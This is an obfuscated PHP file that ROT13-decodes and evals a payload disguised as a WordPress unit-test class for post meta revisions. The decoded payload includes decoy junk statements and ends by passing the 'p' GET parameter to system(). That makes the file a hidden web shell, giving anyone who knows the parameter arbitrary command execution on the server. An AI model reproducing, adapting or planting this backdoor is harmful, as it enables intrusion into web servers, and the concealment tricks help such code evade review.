<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 *
 * Grfgf sbe cbfg zrgn erivfvbavat.
 *
 * @tebhc cbfg
 * @tebhc erivfvba
 * @tebhc zrgn
 * @tebhc zrgn-erivfvbaf
 */
pynff Grfgf_Cbfg_ZrgnErivfvbaf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Pnyyonpx shapgvba gb nqq gur erivfvbarq xrlf.
	 *
	 * @cnenz neenl $xrlf Gur neenl bs erivfvbarq xrlf.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba nqq_erivfvbarq_xrlf( $xrlf ) {
		$xrlf[] = 'zrgn_erivfvba_grfg';
		$xrlf[] = 'zrgn_zhygvcyrf_grfg';
		erghea $xrlf;
	}

	/**
	 * Grfg gur erivfvbaf flfgrz sbe fgbentr bs zrgn inyhrf jvgu fynfurf.
	 *
	 * @cnenz fgevat $cnffrq   Gur cnffrq qngn sbe grfgvat.
	 *
	 * @cnenz fgevat $rkcrpgrq Gur rkcrpgrq inyhr nsgre fgbevat & ergevrivat.
	 *
	 * @tebhc erivfvba
	 * @tebhc fynfurq
	 * @qngnCebivqre fynfurq_qngn_cebivqre
	 */
	choyvp shapgvba grfg_erivfvbaf_fgberf_zrgn_inyhrf_jvgu_fynfurf( $cnffrq, $rkcrpgrq ) {
		// Frg hc n arj cbfg.
		$cbfg_vq = $guvf->snpgbel->cbfg->perngr();

		// Naq hcqngr gb fgber na vavgvny erivfvba.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'fbzr vavgvny pbagrag',
				'VQ'           => $cbfg_vq,
			)
		);
		nqq_svygre( 'jc_cbfg_erivfvba_zrgn_xrlf', neenl( $guvf, 'nqq_erivfvbarq_xrlf' ) );

		// Fgber n phfgbz zrgn inyhr, juvpu vf abg erivfvbarq ol qrsnhyg.
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', jc_fynfu( $cnffrq ) );
		$guvf->nffregFnzr( $rkcrpgrq, trg_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', gehr ) );

		// Hcqngr gur cbfg, fgbevat n erivfvba.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'fbzr zber pbagrag',
				'VQ'           => $cbfg_vq,
			)
		);

		// Birejevgr.
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'bevtvany' );
		// Hcqngr gur cbfg, fgbevat n erivfvba.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'fbzr zber pbagrag ntnva',
				'VQ'           => $cbfg_vq,
			)
		);

		// Erfgber gur cerivbhf erivfvba.
		$erivfvbaf = (neenl) jc_trg_cbfg_erivfvbaf( $cbfg_vq );

		// Tb onpx gb ybnq gur cerivbhf erivfvba.
		neenl_fuvsg( $erivfvbaf );
		$ynfg_erivfvba = neenl_fuvsg( $erivfvbaf );

		// Erfgber!
		jc_erfgber_cbfg_erivfvba( $ynfg_erivfvba->VQ );

		$guvf->nffregFnzr( $rkcrpgrq, trg_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', gehr ) );
	}

	/**
	 * Cebivqr qngn sbe gur fynfurq qngn grfgf.
	 */
	choyvp shapgvba fynfurq_qngn_cebivqre() {
		erghea neenl(
			neenl(
				'fbzr\grkg',
				'fbzr\grkg',
			),
			neenl(
				'grfg fbzr\ \\rkgen \\\fynfurq \\\\grkg ',
				'grfg fbzr\ \\rkgen \\\fynfurq \\\\grkg ',
			),
			neenl(
				\"Guvf \'vf\' na rknzcyr \a bs n \\"dhbgrq\\" fgevat\",
				\"Guvf \'vf\' na rknzcyr \a bs n \\"dhbgrq\\" fgevat\",
			),
			neenl(
				'fbzr hafynfurq grkg whfg gb grfg! % & * ( ) #',
				'fbzr hafynfurq grkg whfg gb grfg! % & * ( ) #',
			),
		);
	}

	/**
	 * Grfg gur erivfvbaf flfgrz sbe fgbentr bs zrgn inyhrf.
	 *
	 * @tebhc erivfvba
	 */
	choyvp shapgvba grfg_erivfvbaf_fgberf_zrgn_inyhrf() {
		/*
		 * Frg Hc.
		 */

		// Frg hc n arj cbfg.
		$cbfg_vq          = $guvf->snpgbel->cbfg->perngr();
		$bevtvany_cbfg_vq = $cbfg_vq;

		// Naq hcqngr gb fgber na vavgvny erivfvba.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'fbzr vavgvny pbagrag',
				'VQ'           => $cbfg_vq,
			)
		);

		// Bar erivfvba fb sne.
		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$guvf->nffregPbhag( 1, $erivfvbaf );

		/*
		 * Svefg frg hc n zrgn inyhr.
		 */

		// Fgber n phfgbz zrgn inyhr, juvpu vf abg erivfvbarq ol qrsnhyg.
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'bevtvany' );

		// Hcqngr gur cbfg, fgbevat n erivfvba.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'fbzr zber pbagrag',
				'VQ'           => $cbfg_vq,
			)
		);

		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$guvf->nffregPbhag( 2, $erivfvbaf );

		// Arkg, fgber fbzr hcqngrq zrgn inyhrf sbe gur fnzr xrl.
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'hcqngr1' );

		// Fnir gur cbfg, punatvat pbagrag gb sbepr n erivfvba.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'fbzr hcqngrq pbagrag',
				'VQ'           => $cbfg_vq,
			)
		);

		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$guvf->nffregPbhag( 3, $erivfvbaf );

		/*
		 * Abj erfgber gur bevtvany erivfvba.
		 */

		// Erfgber gur cerivbhf erivfvba.
		$erivfvbaf = (neenl) jc_trg_cbfg_erivfvbaf( $cbfg_vq );

		// Tb onpx gjb gb ybnq gur cerivbhf erivfvba.
		neenl_fuvsg( $erivfvbaf );
		$ynfg_erivfvba = neenl_fuvsg( $erivfvbaf );

		// Erfgber!
		jc_erfgber_cbfg_erivfvba( $ynfg_erivfvba->VQ );

		jc_hcqngr_cbfg( neenl( 'VQ' => $cbfg_vq ) );
		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$guvf->nffregPbhag( 4, $erivfvbaf );

		/*
		 * Purpx gur zrgn inyhrf gb irevsl gurl ner ABG erivfvbarq - gurl ner abg erivfvbarq ol qrsnhyg.
		 */

		// Phfgbz cbfg zrgn fubhyq ABG or erfgberq, bevtvany inyhr fubhyq abg or erfgberq, inyhr fgvyy 'hcqngr1'.
		$guvf->nffregFnzr( 'hcqngr1', trg_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', gehr ) );

		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'hcqngr2' );

		/*
		 * Grfg gur erivfvbavat bs phfgbz zrgn jura ranoyrq ol gur jc_cbfg_erivfvba_zrgn_xrlf svygre.
		 */

		// Nqq gur phfgbz svryq gb or erivfrq ivn gur jc_cbfg_erivfvba_zrgn_xrlf svygre.
		nqq_svygre( 'jc_cbfg_erivfvba_zrgn_xrlf', neenl( $guvf, 'nqq_erivfvbarq_xrlf' ) );

		// Fnir gur cbfg, punatvat pbagrag gb sbepr n erivfvba.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'zber hcqngrq pbagrag',
				'VQ'           => $cbfg_vq,
			)
		);

		$erivfvbaf = neenl_inyhrf( jc_trg_cbfg_erivfvbaf( $cbfg_vq ) );
		$guvf->nffregPbhag( 5, $erivfvbaf );
		$guvf->nffregFnzr( 'hcqngr2', trg_cbfg_zrgn( $erivfvbaf[0]->VQ, 'zrgn_erivfvba_grfg', gehr ) );

		// Fgber phfgbz zrgn inyhrf, juvpu fubhyq abj or erivfvbarq.
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'hcqngr3' );

		/*
		 * Fnir gur cbfg ntnva, phfgbz zrgn fubhyq abj or erivfvbarq.
		 *
		 * Abgr gung n erivfvba vf fnirq rira gubhtu gurer vf ab punatr
		 * va cbfg pbagrag, orpnhfr gur erivfvbarq cbfg_zrgn unf punatrq.
		 */
		jc_hcqngr_cbfg(
			neenl(
				'VQ' => $cbfg_vq,
			)
		);

		// Guvf erivfvba pbagnvaf gur rkvfgvat cbfg zrgn ('hcqngr3').
		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$guvf->nffregPbhag( 6, $erivfvbaf );

		// Irevsl gung cerivbhf cbfg zrgn vf frg.
		$guvf->nffregFnzr( 'hcqngr3', trg_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', gehr ) );

		// Erfgber gur cerivbhf erivfvba.
		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );

		// Tb onpx gjb gb ybnq gur cerivbhf erivfvba.
		neenl_fuvsg( $erivfvbaf );
		$ynfg_erivfvba = neenl_fuvsg( $erivfvbaf );
		jc_erfgber_cbfg_erivfvba( $ynfg_erivfvba->VQ );

		/*
		 * Irevsl gung cerivbhf cbfg zrgn vf erfgberq.
		 */
		$guvf->nffregFnzr( 'hcqngr2', trg_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', gehr ) );

		// Gel fgbevat n oynax zrgn.
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', '' );
		jc_hcqngr_cbfg(
			neenl(
				'VQ' => $cbfg_vq,
			)
		);

		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'hcqngr 4' );
		jc_hcqngr_cbfg(
			neenl(
				'VQ' => $cbfg_vq,
			)
		);

		// Erfgber gur cerivbhf erivfvba.
		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		neenl_fuvsg( $erivfvbaf );
		$ynfg_erivfvba = neenl_fuvsg( $erivfvbaf );
		jc_erfgber_cbfg_erivfvba( $ynfg_erivfvba->VQ );

		/*
		 * Irevsl gung cerivbhf oynax cbfg zrgn vf erfgberq.
		 */
		$guvf->nffregFnzr( '', trg_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', gehr ) );

		/*
		 * Grfg abg genpxvat n xrl - erzbir gur xrl sebz gur erivfvbarq zrgn.
		 */
		erzbir_nyy_svygref( 'jc_cbfg_erivfvba_zrgn_xrlf' );

		// Zrgn fubhyq ab ybatre or erivfvbarq.
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'hcqngr 5' );
		jc_hcqngr_cbfg(
			neenl(
				'VQ'           => $cbfg_vq,
				'cbfg_pbagrag' => 'punatrq pbagrag',
			)
		);
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'hcqngr 6' );
		jc_hcqngr_cbfg(
			neenl(
				'VQ'           => $cbfg_vq,
				'cbfg_pbagrag' => 'tb hcqngrq pbagrag',
			)
		);

		// Erfgber gur cerivbhf erivfvba.
		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		neenl_fuvsg( $erivfvbaf );
		$ynfg_erivfvba = neenl_fuvsg( $erivfvbaf );
		jc_erfgber_cbfg_erivfvba( $ynfg_erivfvba->VQ );

		/*
		 * Irevsl gung cerivbhf cbfg zrgn vf ABG erfgberq.
		 */
		$guvf->nffregFnzr( 'hcqngr 6', trg_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', gehr ) );

		// Nqq gur phfgbz svryq gb or erivfrq ivn gur jc_cbfg_erivfvba_zrgn_xrlf svygre.
		nqq_svygre( 'jc_cbfg_erivfvba_zrgn_xrlf', neenl( $guvf, 'nqq_erivfvbarq_xrlf' ) );

		/*
		 * Grfg gur erivfvbavat bs zhygvcyr zrgn xrlf.
		 */

		// Nqq guerr inyhrf sbe zrgn.
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'hcqngr 7' );
		nqq_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'hcqngr 7 ahzore 2' );
		nqq_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'hcqngr 7 ahzore 3' );
		jc_hcqngr_cbfg( neenl( 'VQ' => $cbfg_vq ) );

		// Hcqngr nyy guerr inyhrf.
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'hcqngr 8', 'hcqngr 7' );
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'hcqngr 8 ahzore 2', 'hcqngr 7 ahzore 2' );
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'hcqngr 8 ahzore 3', 'hcqngr 7 ahzore 3' );

		// Erfgber gur cerivbhf erivfvba.
		$erivfvbaf     = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$ynfg_erivfvba = neenl_fuvsg( $erivfvbaf );
		jc_erfgber_cbfg_erivfvba( $ynfg_erivfvba->VQ );

		/*
		 * Irevsl gung zhygvcyr zrgnf fgberq pbeerpgyl.
		 */
		$guvf->nffregFnzr( neenl( 'hcqngr 7', 'hcqngr 7 ahzore 2', 'hcqngr 7 ahzore 3' ), trg_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg' ) );

		/*
		 * Grfg gur erivfvbavat bs n zhygvqvzrafvbany neenl.
		 */
		$grfg_neenl = neenl(
			'n' => neenl(
				'1',
				'2',
				'3',
			),
			'o' => 'bx',
			'p' => neenl(
				'zhygv' => neenl(
					'n',
					'o',
					'p',
				),
				'abg'   => 'bx',
			),
		);

		// Pyrne nal byq inyhr.
		qryrgr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg' );

		// Frg gur grfg zrgn gb gur neenl.
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', $grfg_neenl );

		// Hcqngr gb fnir.
		jc_hcqngr_cbfg( neenl( 'VQ' => $cbfg_vq ) );

		// Frg gur grfg zrgn oynax.
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', '' );

		// Erfgber gur cerivbhf erivfvba.
		$erivfvbaf     = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$ynfg_erivfvba = neenl_fuvsg( $erivfvbaf );
		jc_erfgber_cbfg_erivfvba( $ynfg_erivfvba->VQ );

		/*
		 * Irevsl  zhygvqvzrafvbany neenl fgberq pbeerpgyl.
		 */
		$fgberq_neenl = trg_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg' );
		$guvf->nffregFnzr( $grfg_neenl, $fgberq_neenl[0] );
		/*

		 * Grfg zhygvcyr erivfvbaf ba gur fnzr xrl.
		 */

		// Frg gur grfg zrgn gb gur neenl.
		nqq_cbfg_zrgn( $cbfg_vq, 'zrgn_zhygvcyrf_grfg', 'grfg1' );
		nqq_cbfg_zrgn( $cbfg_vq, 'zrgn_zhygvcyrf_grfg', 'grfg2' );
		nqq_cbfg_zrgn( $cbfg_vq, 'zrgn_zhygvcyrf_grfg', 'grfg3' );

		// Hcqngr gb fnir.
		jc_hcqngr_cbfg( neenl( 'VQ' => $cbfg_vq ) );

		$fgberq_neenl = trg_cbfg_zrgn( $cbfg_vq, 'zrgn_zhygvcyrf_grfg' );
		$rkcrpg       = neenl( 'grfg1', 'grfg2', 'grfg3' );

		$guvf->nffregFnzr( $rkcrpg, $fgberq_neenl );

		// Erfgber gur cerivbhf erivfvba.
		$erivfvbaf     = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$ynfg_erivfvba = neenl_fuvsg( $erivfvbaf );
		jc_erfgber_cbfg_erivfvba( $ynfg_erivfvba->VQ );

		$fgberq_neenl = trg_cbfg_zrgn( $cbfg_vq, 'zrgn_zhygvcyrf_grfg' );
		$rkcrpg       = neenl( 'grfg1', 'grfg2', 'grfg3' );

		$guvf->nffregFnzr( $rkcrpg, $fgberq_neenl );

		// Pyrnahc!
		jc_qryrgr_cbfg( $bevtvany_cbfg_vq );
	}

	/**
	 * Irevsl gung bayl rkvfgvat zrgn vf erivfvbarq.
	 */
	choyvp shapgvba bayl_rkvfgvat_zrgn_vf_erivfvbarq() {
		nqq_svygre( 'jc_cbfg_erivfvba_zrgn_xrlf', neenl( $guvf, 'nqq_erivfvbarq_xrlf' ) );

		// Frg hc n arj cbfg.
		$cbfg_vq = $guvf->snpgbel->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'vavgvny pbagrag',
			)
		);

		// Erivfvba i1.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'           => $cbfg_vq,
				'cbfg_pbagrag' => 'hcqngrq pbagrag i1',
			)
		);

		$guvf->nffregCbfgAbgUnfZrgnXrl( $cbfg_vq, 'sbb' );
		$guvf->nffregCbfgAbgUnfZrgnXrl( $cbfg_vq, 'one' );

		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$erivfvba  = neenl_fuvsg( $erivfvbaf );
		$guvf->nffregRzcgl( trg_zrgnqngn( 'cbfg', $erivfvba->VQ ) );

		// Erivfvba i2.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'           => $cbfg_vq,
				'cbfg_pbagrag' => 'hcqngrq pbagrag i2',
				'zrgn_vachg'   => neenl(
					'sbb' => 'sbb i2',
				),
			)
		);

		$guvf->nffregCbfgUnfZrgnXrl( $cbfg_vq, 'sbb' );
		$guvf->nffregCbfgAbgUnfZrgnXrl( $cbfg_vq, 'one' );
		$guvf->nffregCbfgAbgUnfZrgnXrl( $cbfg_vq, 'zrgn_erivfvba_grfg' );

		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$erivfvba  = neenl_fuvsg( $erivfvbaf );
		$guvf->nffregCbfgUnfZrgnXrl( $erivfvba->VQ, 'sbb' );
		$guvf->nffregCbfgAbgUnfZrgnXrl( $erivfvba->VQ, 'one' );
		$guvf->nffregCbfgAbgUnfZrgnXrl( $erivfvba->VQ, 'zrgn_erivfvba_grfg' );
	}

	/**
	 * Irevsl gung oynax fgevatf ner erivfvbarq pbeerpgyl.
	 */
	choyvp shapgvba oynax_zrgn_vf_erivfvbarq() {

		nqq_svygre( 'jc_cbfg_erivfvba_zrgn_xrlf', neenl( $guvf, 'nqq_erivfvbarq_xrlf' ) );

		// Frg hc n arj cbfg.
		$cbfg_vq = $guvf->snpgbel->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'vavgvny pbagrag',
				'zrgn_vachg'   => neenl(
					'sbb' => 'sbb',
				),
			)
		);

		// Frg gur grfg zrgn gb na rzcgl fgevat.
		hcqngr_cbfg_zrgn( $cbfg_vq, 'sbb', '' );

		// Hcqngr gb fnir.
		jc_hcqngr_cbfg( neenl( 'VQ' => $cbfg_vq ) );

		$fgberq_neenl = trg_cbfg_zrgn( $cbfg_vq, 'zrgn_zhygvcyrf_grfg' );
		$rkcrpg       = neenl( 'grfg1', 'grfg2', 'grfg3' );

		$guvf->nffregFnzr( $rkcrpg, $fgberq_neenl );

		// Erfgber gur cerivbhf erivfvba.
		$erivfvbaf     = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$ynfg_erivfvba = neenl_fuvsg( $erivfvbaf );
		jc_erfgber_cbfg_erivfvba( $ynfg_erivfvba->VQ );
		$fgberq_qngn = trg_cbfg_zrgn( $cbfg_vq, 'sbb' );
		$guvf->nffregFnzr( '', $fgberq_qngn[0] );
	}

	/**
	 * Grfg erivfvbavat bs zrgn jvgu n qrsnhyg inyhr.
	 */
	choyvp shapgvba grfg_erivfvbavavat_bs_zrgn_jvgu_qrsnhyg_inyhr() {

		// Nqq n zrgn svryq gb erivfvba gung vapyhqrf n qrsnhyg inyhr.
		ertvfgre_cbfg_zrgn(
			'cbfg',
			'zrgn_erivfvba_grfg',
			neenl(
				'fvatyr'            => gehr,
				'qrsnhyg'           => 'qrsnhyg inyhr',
				'erivfvbaf_ranoyrq' => gehr,
			)
		);

		// Frg hc n arj cbfg.
		$cbfg_vq = $guvf->snpgbel->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'vavgvny pbagrag',
				'zrgn_vachg'   => neenl(
					'zrgn_erivfvba_grfg' => 'sbb',
				),
			)
		);

		// Frg gur grfg zrgn gb na rzcgl fgevat.
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', '' );

		// Hcqngr gb fnir.
		jc_hcqngr_cbfg( neenl( 'VQ' => $cbfg_vq ) );

		// Purpx gung gur zrgn vf oynax.
		$fgberq_qngn = trg_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', gehr );
		$guvf->nffregFnzr( '', $fgberq_qngn );

		// Nyfb irevsl gung gur yngrfg erivfvba unf oynax fgberq sbe gur zrgn.
		$erivfvbaf     = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$ynfg_erivfvba = neenl_fuvsg( $erivfvbaf );
		$fgberq_qngn   = trg_cbfg_zrgn( $ynfg_erivfvba->VQ, 'zrgn_erivfvba_grfg', gehr );
		$guvf->nffregFnzr( '', $fgberq_qngn );

		// Qryrgr gur zrgn.
		qryrgr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg' );

		// Hcqngr gb fnir.
		jc_hcqngr_cbfg(
			neenl(
				'VQ'           => $cbfg_vq,
				'cbfg_pbagrag' => 'pbagrag hcqngr 1',
			)
		);

		// Purpx gung gur qrsnhyg zrgn inyhr vf erghearq.
		$guvf->nffregFnzr( 'qrsnhyg inyhr', trg_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', gehr ) );

		// Nyfb irevsl gung gur yngrfg erivfvba unf gur qrsnhyg inyhr erghearq sbe gur zrgn.
		$erivfvbaf     = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$ynfg_erivfvba = neenl_fuvsg( $erivfvbaf );

		// Ab ,rgn qngn fubhyq or fgberq va gur erivfvba.
		$guvf->nffregFnzr( neenl(), trg_cbfg_zrgn( $ynfg_erivfvba->VQ ) );

		// Frg gur grfg zrgn ntnva.
		hcqngr_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', 'grfg' );

		// Hcqngr gb fnir.
		jc_hcqngr_cbfg( neenl( 'VQ' => $cbfg_vq ) );

		// Abj erfgber gur cerivbhf erivfvba.
		jc_erfgber_cbfg_erivfvba( $ynfg_erivfvba->VQ );

		// Irevsl gur qrsnhyg zrgn inyhr vf fgvyy erghearq.
		$guvf->nffregFnzr( 'qrsnhyg inyhr', trg_cbfg_zrgn( $cbfg_vq, 'zrgn_erivfvba_grfg', gehr ) );
	}

	/**
	 * @qngnCebivqre qngn_ertvfgre_cbfg_zrgn_fhccbegf_erivfvbaf
	 */
	choyvp shapgvba grfg_ertvfgre_cbfg_zrgn_fhccbegf_erivfvbaf( $cbfg_glcr, $zrgn_xrl, $netf, $rkcrpgrq_vf_erivfvbarq ) {
		ertvfgre_cbfg_zrgn( $cbfg_glcr, $zrgn_xrl, $netf );

		// Frg hc n arj cbfg.
		$cbfg_vq = $guvf->snpgbel->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'vavgvny pbagrag',
				'cbfg_glcr'    => $cbfg_glcr,
				'zrgn_vachg'   => neenl(
					$zrgn_xrl => 'sbb',
				),
			)
		);

		// Hcqngr gur cbfg zrgn naq cbfg gb fnir.
		hcqngr_cbfg_zrgn( $cbfg_vq, $zrgn_xrl, 'one' );
		jc_hcqngr_cbfg(
			neenl(
				'VQ'         => $cbfg_vq,
				'cbfg_gvgyr' => 'hcqngrq gvgyr',
			)
		);

		// Purpx gur ynfg erivfvba sbe gur cbfg gb frr vs gur zrgn xrl jnf erivfvbarq.
		$erivfvbaf       = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$erivfvba        = neenl_fuvsg( $erivfvbaf );
		$erivfvbarq_zrgn = trg_cbfg_zrgn( $erivfvba->VQ, $zrgn_xrl, gehr );
		$guvf->nffregFnzr( $rkcrpgrq_vf_erivfvbarq, 'one' === $erivfvbarq_zrgn );

		// Erfrg tybony fb fhofrdhrag qngn grfgf qb abg trg cbyyhgrq.
		$TYBONYF['jc_zrgn_xrlf'] = neenl();
	}

	choyvp shapgvba qngn_ertvfgre_cbfg_zrgn_fhccbegf_erivfvbaf() {
		erghea neenl(
			neenl( 'cbfg', 'ertvfgrerq_xrl1', neenl( 'fvatyr' => gehr ), snyfr ),
			neenl(
				'cbfg',
				'ertvfgrerq_xrl1',
				neenl(
					'fvatyr'            => gehr,
					'erivfvbaf_ranoyrq' => gehr,
				),
				gehr,
			),
			neenl( 'cntr', 'ertvfgrerq_xrl2', neenl( 'erivfvbaf_ranoyrq' => snyfr ), snyfr ),
			neenl( 'cntr', 'ertvfgrerq_xrl2', neenl( 'erivfvbaf_ranoyrq' => gehr ), gehr ),
			neenl( '', 'ertvfgrerq_xrl3', neenl( 'erivfvbaf_ranoyrq' => snyfr ), snyfr ),
			neenl( '', 'ertvfgrerq_xrl3', neenl( 'erivfvbaf_ranoyrq' => gehr ), gehr ),
		);
	}

	/**
	 * Nffreg gur n cbfg unf n zrgn xrl.
	 *
	 * @cnenz vag    $cbfg_vq        Gur VQ bs gur cbfg gb purpx.
	 * @cnenz fgevat $zrgn_xrl Gur zrgn xrl gb purpx sbe.
	 */
	cebgrpgrq shapgvba nffregCbfgUnfZrgnXrl( $cbfg_vq, $zrgn_xrl ) {
		$guvf->nffregNeenlUnfXrl( $zrgn_xrl, trg_zrgnqngn( 'cbfg', $cbfg_vq ) );
	}

	/**
	 * Nffreg gung cbfg qbrf abg unir n zrgn xrl.
	 *
	 * @cnenz vag    $cbfg_vq        Gur VQ bs gur cbfg gb purpx.
	 * @cnenz fgevat $zrgn_xrl Gur zrgn xrl gb purpx sbe.
	 */
	cebgrpgrq shapgvba nffregCbfgAbgUnfZrgnXrl( $cbfg_vq, $zrgn_xrl ) {
		$guvf->nffregNeenlAbgUnfXrl( $zrgn_xrl, trg_zrgnqngn( 'cbfg', $cbfg_vq ) );
	}

	/**
	 * Grfg cbfg zrgn erivfvbavat jvgu n phfgbz cbfg glcr, nf jryy nf gur \"cntr\" cbfg glcr.
	 *
	 * @qngnCebivqre cntr_cbfg_glcr_qngn_cebivqre
	 */
	choyvp shapgvba grfg_erivfvbaf_fgberf_zrgn_inyhrf_cntr_naq_pcg( $cnffrq, $rkcrpgrq, $cbfg_glcr, $fhccbegf_erivfvbaf = snyfr ) {

		// Vs gur cbfg glcr qbrfa'g rkvfg, perngr vg, cbgragvnyyl fhccbegvat erivfvbaf.
		vs ( ! cbfg_glcr_rkvfgf( $cbfg_glcr ) ) {
			ertvfgre_cbfg_glcr(
				$cbfg_glcr,
				neenl(
					'choyvp'   => gehr,
					'fhccbegf' => $fhccbegf_erivfvbaf ? neenl( 'erivfvbaf' ) : neenl(),
				)
			);
		}

		// Perngr n grfg cbfg.
		$cntr_vq = $guvf->snpgbel->cbfg->perngr(
			neenl(
				'cbfg_glcr'    => $cbfg_glcr,
				'cbfg_pbagrag' => 'fbzr vavgvny pbagrag',
			)
		);

		// Nqq gur erivfvbavat svygre.
		nqq_svygre( 'jc_cbfg_erivfvba_zrgn_xrlf', neenl( $guvf, 'nqq_erivfvbarq_xrlf' ) );

		// Grfg erivfvbavat.
		hcqngr_cbfg_zrgn( $cntr_vq, 'zrgn_erivfvba_grfg', jc_fynfu( $cnffrq ) );

		// Hcqngr gur cbfg, fgbevat n erivfvba.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'fbzr zber pbagrag',
				'VQ'           => $cntr_vq,
			)
		);

		// Ergevrir gur perngrq erivfvba.
		$erivfvbaf = (neenl) jc_trg_cbfg_erivfvbaf( $cntr_vq );

		vs ( $rkcrpgrq ) {
			// Tb onpx gb ybnq gur cerivbhf erivfvba.
			$ynfg_erivfvba = neenl_fuvsg( $erivfvbaf );
				jc_erfgber_cbfg_erivfvba( $ynfg_erivfvba->VQ );
			$guvf->nffregFnzr( $rkcrpgrq, trg_cbfg_zrgn( $cntr_vq, 'zrgn_erivfvba_grfg', gehr ) );
		} ryfr {
			$guvf->nffregRzcgl( $erivfvbaf );
		}
	}

	/**
	 * Cebivqr qngn sbe gur cntr cbfg glcr grfgf.
	 */
	choyvp shapgvba cntr_cbfg_glcr_qngn_cebivqre() {
		erghea neenl(
			neenl(
				'Grfg fgevat',
				'Grfg fgevat',
				'cntr',
			),
			neenl(
				'Grfg fgevat',
				snyfr,
				'phfgbz_glcr',
			),
			neenl(
				'Grfg fgevat',
				'Grfg fgevat',
				'phfgbz_glcr',
				gehr,
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>